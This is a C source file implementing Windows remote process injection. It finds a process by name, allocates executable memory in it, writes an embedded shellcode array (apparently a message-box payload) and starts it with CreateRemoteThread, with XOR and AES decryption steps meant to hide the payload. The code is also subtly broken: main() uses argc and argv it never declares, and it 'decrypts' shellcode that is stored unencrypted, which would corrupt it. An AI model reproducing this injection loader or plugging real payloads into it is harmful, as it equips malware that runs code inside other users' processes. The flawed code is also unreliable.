#include <stdio.h>
#include "aes.h"
#include <windows.h>
#include <tlhelp32.h>
#include <wchar.h>

unsigned char key[] = { 'n', 'o', 't', 'a', 'k', 'e', 'y', 'o', 'f', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'i', 'o', 'n' };
unsigned char aesKey[] = "\x4d\xf7\xb9\xa7\xf0\xca\x4c\x08\xbc\xd2\x2b\xbc\xe7\xc0\x5b\x8b\xa4\x46\xcb\x6f\x9b\xc3\x74\x52\x96\x22\xa4\x18\x7d\xff\x97\xe0";
unsigned char aesiv[] = "\xa7\xae\xd8\xca\x15\x83\x3d\x33\x51\xa2\xa3\xf6\x6c\x69\x42\x79";

unsigned char shellcode[] = "\x90\x90\x90\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x11\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\x50\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x11\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\xa5\xe9\xbf\xc0\xff\xd5\x41\xb9\x00\x00\x00\x00\xe8\x06\x00\x00\x00\x48\x65\x6c\x6c\x6f\x00\x5a\xe8\x05\x00\x00\x00\x49\x6e\x66\x6f\x00\x41\x58\x48\x31\xc9\x41\xba\xef\x14\x7f\xd0\xff\xd5\x48\x31\xc9\x41\xba\xe4\xfc\xd6\xc9\xff\xd5";


void xorDecrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
    for (size_t i = 0; i < payload_len; ++i) {
        payload[i] ^= key[i % key_len];
    }
}

// Function to get the PID of a process by its name
DWORD getPid(const wchar_t* process) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD process_id = 0;

    // Take a snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[ERROR] CreateToolhelp32Snapshot failed [%d]\n", GetLastError());
        return 0;
    }

    // Initialize the PROCESSENTRY32 structure
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process
    if (!Process32FirstW(hSnapshot, &pe32)) {
        wprintf(L"[ERROR] Process32First failed [%d]\n", GetLastError());
        CloseHandle(hSnapshot); // clean the snapshot object
        return 0;
    }

    // Iterate through the snapshot to find the process
    do {
        //wprintf(L"Checking process: %s\n", pe32.szExeFile);
        if (_wcsicmp(pe32.szExeFile, process) == 0) {
            process_id = pe32.th32ProcessID;
            wprintf(L"Found process: %s with PID: %d\n", process, process_id);
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot); // clean the snapshot object
    return process_id;
}

int main() {
    if (argc != 2) {
        fwprintf(stderr, L"Usage: %s <process>\n", argv[0]);
        wprintf(L"\nExample: %s notepad.exe\n", argv[0]);
        return 1;
    }

   xorDecrypt(shellcode, sizeof(shellcode), key, sizeof(key));

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesiv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));

    // Get the process name from the command line arguments
    const wchar_t* process = argv[1];
    DWORD pid = getPid(process);
    if (pid == 0) {
        wprintf(L"Process %s not found.\n", process);
        return 1;
    }

    wprintf(L"[+] PID: %d\n", pid);

    // Open the target process with necessary permissions
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        wprintf(L"[ERROR] Could not open process [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] Process open successfully!\n");

    // Allocate memory for shellcode
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pAddress == NULL) {
        wprintf(L"[ERROR] Could not allocate remote memory [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 100;
    }

    printf("[+] Memory allocated Successfully!\n");

    // Write the shellcode into memory
    if (WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), NULL) == 0) {
        wprintf(L"[ERROR] Could not write to remote memory [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 101;
    }

    printf("[+] Shellcode has been writen in the memory successfully!\n");

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        wprintf(L"[ERROR] Could not create new thread [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 102;
    }

    printf("[+] Remote has been created successfully!\n");

    // Wait for the remote thread to complete execution
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}